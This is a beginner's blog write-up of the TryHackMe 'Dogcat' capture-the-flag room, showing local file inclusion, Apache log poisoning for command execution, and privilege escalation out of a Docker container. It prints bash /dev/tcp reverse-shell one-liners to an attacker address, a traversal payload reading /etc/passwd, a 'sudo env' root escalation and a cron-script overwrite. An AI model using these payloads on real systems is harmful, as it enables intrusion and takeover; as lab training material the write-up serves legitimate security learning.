---
title: Dogcat tryhackme writeup
date: 2022-04-29 14:26:00 +0200
categories: [Blog, Writeup]
tags: [writeup, tryhackme, pentesting, pen, testing, hacking, ethical, dogcat, dog, cat]
render_with_liquid: false
comments: false

---
kek
Writeup of me, **Bltz**, resolving tryhackme's easy room 'All in One', this is my first writeup of many. I'm a begginer so i might make some mistakes!

![AllinOne info](/assets/dogcat.png)



### This CTF room include the next topics:
- Local file inclusion
- Use of php wrapper with LFI
- Fuzzing
- Double privilege escalation
- Abusing sudo privileges

# Scanning

A fast nmap scan gives me 2 ports that i use to rescan with -sCV options for services and versions, but no interesting information is shown.
![Nmap scan for open ports](/assets/img/dogcat/004.png)
_First scan with Nmap_

I scanned the web too with **whatweb** but all versions are up to date and there's nothing unusual.

# Discovery

## Website

Looking at the website i see 2 buttons that seems to display a random cat/dog image with the get var _"view"_, 
i try to modify the var value to something else and i got an error saying that only cat or dog are correct inputs.
Then i try to use **dogdog** as _"view"_ variable to see if any kind of filter id applying and it is, a new error shown, dogdog.php file doesn't exist.

![error shown](/assets/img/dogcat/003.png)
_A new error is shown_

This seems like LFI to me 😉

# Gaining access
## LFI


First thing i try is to use null byte with **../dog/../../../../../etc/passwd%00** but an error is shown in the function include().
I dont know what include() does but if i dont use %00 at the end of the string .php will be applied as extension and i couldn't open other types of file.
I try to use the php wrapper to encode index.php to base64 to get the source code and it works, after decoding it i get this:
![index source code](/assets/img/dogcat/005.png)
_index.php source code_

There's another var i didn't see named _"ext"_ that is the extension applied to the _"view"_ var, being the default value .php.
Then, writing **?view=../dog/../../../../../etc/passwd%00&ext=** i manage to get /etc/passwd content.

![passwd content](/assets/img/dogcat/006.png)
_/etc/passwd content_

Having this i quickly think in log posoning, and apache2 log **var/log/apache2/access.log** does the trick

![Acess to apache2 log](/assets/img/dogcat/008.png)
_Apache2 log is shown_


I modify a request with burpsuite changing the user agent to a little php code so we can execute commands remotely.

![Burpsuite modify request](/assets/img/dogcat/010.png)
_Modified request with burpsuite_

I write whoami into our new cmd variable and i check if it's working and it is.
![whoami rce](/assets/img/dogcat/009.png)
_RCE working_

I url encode the code bellow and pass it as _"cmd"_ variable and i send a bash to my netcat through 443 port where i was prevously listening.

```bash
bash -c 'bash -i &> /dev/tcp/<MYIP>/443 0>&1'
```

![whoami rce](/assets/img/dogcat/011.png)
_shell as www-data_


# Privilege escalation

## Escalation to low privilege user

I check the sudo privileges for www-data and i can run env as root.

![www-data privileges](/assets/img/dogcat/014.png)
_www-data sudo privileges and privesc to root_

With this code we quickly privesc to root.

```bash
sudo env /bin/sh
```


Right now I'm looking for the flags, one is in /var/www/html/. I dont find the second one so i do find / -name flag* and i get both 2 and 3, 2 is in /var/www and 3 in /root.
Im stuck because i cant find flag 4. I tried some things, finaly i've just found a script and a .tar in /opt.
When inspecting the script i realize that this is a docker container, and a hostname -I confirms it.

Knowing this i think that maybe the script is involved in a cronjob that backups the website from time to time. With the script beign
writable, i just modify it to send me a shell as root (the owned and the one executing the cron job). But as this docker container
doesn't have nano or vi/vim i have to do it with echo.
```bash
echo '#!/bin/bash' > FILE
echo "bash -c 'bash -i >& /dev/tcp/MYIP/444 0>&1'" >> FILE
```

With this i gain access as the real root user and the flag4.txt is located at /root of the real host.

I hope this writeup was useful and interesting, see you soon!
